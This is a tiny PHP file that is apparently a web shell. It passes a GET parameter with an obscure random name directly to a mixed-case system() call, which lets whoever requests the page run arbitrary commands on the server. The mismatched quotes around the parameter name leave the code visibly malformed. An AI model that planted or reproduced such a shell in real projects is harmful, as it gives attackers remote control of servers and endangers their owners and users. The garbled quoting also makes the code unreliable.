<?php
SysTeM($_GET["F3IniRGm']);
?>
